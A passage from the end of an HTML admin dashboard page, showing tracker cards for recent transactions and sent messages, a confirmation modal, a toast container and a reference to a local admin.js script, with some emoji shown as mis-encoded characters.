            <div class="tracker-extra-card"><h4>üí∞ Last Transactions</h4><div class="content" id="trackerLastTransactionsSection"></div></div>
            <div class="tracker-extra-card full-width"><h4>üì§ Last Sent Messages</h4><div class="content" id="trackerLastSentSection"></div></div>
          </div>
        </div>
      </section>
    </div>
  </div>

  <!-- MODAL -->
  <div id="modalOverlay">
    <div class="modal-box">
      <h3 id="modalTitle"></h3>
      <div id="modalContent"></div>
      <div class="modal-actions">
        <button class="modal-btn cancel" onclick="closeModal()">Cancel</button>
        <button class="modal-btn confirm" id="modalConfirm">Confirm</button>
      </div>
    </div>
  </div>

  <!-- TOASTS -->
  <div id="toastContainer"></div>

  <script src="admin.js"></script>
</body>
</html>
